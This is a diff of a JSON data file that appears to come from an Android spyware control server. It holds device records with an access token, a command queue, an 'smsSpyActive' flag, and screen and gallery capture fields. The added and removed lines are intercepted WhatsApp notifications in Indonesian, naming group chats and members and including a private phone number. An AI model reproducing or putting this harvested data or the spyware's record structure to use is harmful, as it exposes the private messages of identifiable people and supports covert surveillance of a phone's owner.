@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776922091548,
+    "lastSeen": 1776922100394,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎68 pesan dari 41 chat",
+        "time": "23/04 13:28",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776922103164
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4011,14 +4019,6 @@
         "time": "23/04 09:45",
         "pkg": "com.whatsapp",
         "receivedAt": 1776908702877
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 851-3406-5819",
-        "content": "Oke",
-        "time": "23/04 09:45",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776908702756
       }
     ],
     "galleryPhotos": [],
@@ -9972,6 +9972,22 @@
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
+        "content": "‎‎193 pesan dari 4 chat",
+        "time": "23/04 13:28",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776922103359
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Senam Rappocini (2 pesan): ~ Ummu Afzal Athallah",
+        "content": "Ie tidak mi di jalan kaki odong atw naik maxride hahhahahhaha 😂😁🤭",
+        "time": "23/04 13:28",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776922103325
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
         "content": "‎‎192 pesan dari 4 chat",
         "time": "23/04 13:28",
         "pkg": "com.whatsapp",
@@ -13952,22 +13968,6 @@
         "time": "22/04 17:11",
         "pkg": "com.whatsapp",
         "receivedAt": 1776849087386
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎193 pesan dari 4 chat",
-        "time": "22/04 17:11",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776849087376
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎Class 8.10 ‼️ (79 pesan): ~ VianBakri",
-        "content": "Jln mi dulu",
-        "time": "22/04 17:11",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776849087271
       }
     ],
     "galleryPhotos": [],
